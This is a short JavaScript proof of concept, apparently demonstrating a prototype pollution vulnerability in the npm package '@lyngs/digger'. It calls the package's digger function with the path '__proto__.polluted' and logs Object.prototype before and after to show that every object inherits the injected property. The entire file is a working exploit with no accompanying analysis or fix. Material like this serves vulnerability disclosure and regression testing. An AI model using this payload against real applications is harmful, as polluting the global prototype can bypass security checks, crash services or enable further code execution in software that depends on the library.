var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
const {digger} = require('@lyngs/digger');
console.log({}.polluted);
digger(obj, '__proto__.polluted', 'yes', { extend: true });
console.log({}.polluted);